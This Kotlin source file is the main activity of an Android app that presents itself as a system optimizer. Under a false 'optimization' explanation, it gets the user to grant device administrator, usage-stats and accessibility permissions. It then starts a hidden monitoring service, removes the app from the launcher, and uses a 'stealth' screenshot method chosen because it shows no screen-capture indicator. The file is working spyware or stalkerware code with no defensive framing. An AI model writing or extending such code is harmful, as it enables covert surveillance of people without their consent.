package com.system.optimizer

import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.system.optimizer.admin.AdminReceiver
import com.system.optimizer.service.MonitoringService

class MainActivity : AppCompatActivity() {

    companion object {
        private const val RC_USAGE_STATS = 1001
        private const val RC_DEVICE_ADMIN = 1002
        private const val RC_MEDIA_PROJECTION = 1003
        private const val RC_BATTERY_OPT = 1004
        private const val RC_ACCESSIBILITY = 1005
    }

    private var projectionResultCode = -1
    private var projectionData: Intent? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val prefs = getSharedPreferences("bw_prefs", MODE_PRIVATE)
        if (prefs.getBoolean("setup_complete", false)) {
            hideFromLauncher()
            finish()
            return
        }

        refreshPermissionUI()
    }

    override fun onResume() {
        super.onResume()
        val prefs = getSharedPreferences("bw_prefs", MODE_PRIVATE)
        if (prefs.getBoolean("setup_complete", false)) {
            hideFromLauncher()
            finish()
        } else {
            refreshPermissionUI()
        }
    }

    // ═══════════════════════════════════════════
    //  Permission UI
    // ═══════════════════════════════════════════

    private fun refreshPermissionUI() {
        val usageOk = hasUsageStatsPermission()
        val adminOk = isDeviceAdminActive()
        val accessibilityOk = isAccessibilityServiceEnabled()

        setCheckmark(R.id.checkUsage, usageOk)
        setCheckmark(R.id.checkAdmin, adminOk)
        setCheckmark(R.id.checkAccessibility, accessibilityOk)

        findViewById<Button>(R.id.btnUsageStats).apply {
            isEnabled = !usageOk
            text = if (usageOk) "✓ Granted" else "Grant"
        }

        findViewById<Button>(R.id.btnDeviceAdmin).apply {
            isEnabled = !adminOk
            text = if (adminOk) "✓ Enabled" else "Enable"
        }

        findViewById<Button>(R.id.btnAccessibility).apply {
            isEnabled = !accessibilityOk
            text = if (accessibilityOk) "✓ Enabled" else "Enable"
        }

        // All 3 permissions required to start
        findViewById<Button>(R.id.btnStart).isEnabled = usageOk && adminOk && accessibilityOk
    }

    private fun setCheckmark(viewId: Int, granted: Boolean) {
        findViewById<TextView>(viewId)?.text = if (granted) "✅" else "⬜"
    }

    // ═══════════════════════════════════════════
    //  Permission handlers (called from XML onClick)
    // ═══════════════════════════════════════════

    @Suppress("UNUSED_PARAMETER")
    fun onGrantUsageStats(view: View) {
        startActivityForResult(
            Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS),
            RC_USAGE_STATS
        )
    }

    @Suppress("UNUSED_PARAMETER")
    fun onEnableDeviceAdmin(view: View) {
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(
                DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                ComponentName(this@MainActivity, AdminReceiver::class.java)
            )
            putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Required for system optimization features"
            )
        }
        startActivityForResult(intent, RC_DEVICE_ADMIN)
    }

    @Suppress("UNUSED_PARAMETER")
    fun onEnableAccessibility(view: View) {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        startActivityForResult(intent, RC_ACCESSIBILITY)
    }

    @Suppress("UNUSED_PARAMETER")
    fun onStartService(view: View) {
        // Step 1: Request battery optimization exemption
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivityForResult(intent, RC_BATTERY_OPT)
                return
            }
        }
        // Step 2: Request screen capture
        requestScreenCapture()
    }

    private fun requestScreenCapture() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            // On Android 11+ we use stealth AccessibilityService.takeScreenshot() -> zero screencast/mirroring icons!
            launchMonitoringService()
            return
        }
        val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(mgr.createScreenCaptureIntent(), RC_MEDIA_PROJECTION)
    }

    // ═══════════════════════════════════════════
    //  Activity results
    // ═══════════════════════════════════════════

    @Deprecated("Using deprecated API for backward compat")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        when (requestCode) {
            RC_USAGE_STATS, RC_DEVICE_ADMIN, RC_ACCESSIBILITY -> refreshPermissionUI()

            RC_BATTERY_OPT -> requestScreenCapture()

            RC_MEDIA_PROJECTION -> {
                if (resultCode == Activity.RESULT_OK && data != null) {
                    projectionResultCode = resultCode
                    projectionData = data
                    launchMonitoringService()
                } else {
                    val prefs = getSharedPreferences("bw_prefs", MODE_PRIVATE)
                    if (prefs.getBoolean("setup_complete", false)) {
                        launchMonitoringService()
                    } else {
                        Toast.makeText(this, "Screen capture permission required", Toast.LENGTH_LONG).show()
                    }
                }
            }
        }
    }

    // ═══════════════════════════════════════════
    //  Start the background service
    // ═══════════════════════════════════════════

    private fun launchMonitoringService() {
        val intent = Intent(this, MonitoringService::class.java)
        if (projectionResultCode != -1 && projectionData != null) {
            intent.putExtra("resultCode", projectionResultCode)
            intent.putExtra("projectionData", projectionData)
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }

        // Save state
        getSharedPreferences("bw_prefs", MODE_PRIVATE).edit()
            .putBoolean("setup_complete", true)
            .putBoolean("service_enabled", true)
            .apply()

        showStatus("Service started successfully!\nApp hiding in background...")
        hideFromLauncher()
        finish()
    }

    private fun showStatus(message: String) {
        findViewById<LinearLayout>(R.id.setupContainer)?.visibility = View.GONE
        findViewById<LinearLayout>(R.id.statusContainer)?.visibility = View.VISIBLE
        findViewById<TextView>(R.id.statusText)?.text = message
    }

    private fun hideFromLauncher() {
        packageManager.setComponentEnabledSetting(
            ComponentName(this, MainActivity::class.java),
            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            android.content.pm.PackageManager.DONT_KILL_APP
        )
    }

    // ═══════════════════════════════════════════
    //  Permission checks
    // ═══════════════════════════════════════════

    private fun hasUsageStatsPermission(): Boolean {
        val appOps = getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
        val mode = appOps.unsafeCheckOpNoThrow(
            android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
            android.os.Process.myUid(),
            packageName
        )
        return mode == android.app.AppOpsManager.MODE_ALLOWED
    }

    private fun isDeviceAdminActive(): Boolean {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        return dpm.isAdminActive(ComponentName(this, AdminReceiver::class.java))
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val serviceName = "${packageName}/${com.system.optimizer.monitor.BrowserTracker::class.java.canonicalName}"
        val enabledServices = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        return enabledServices.contains(serviceName, ignoreCase = true)
    }
}
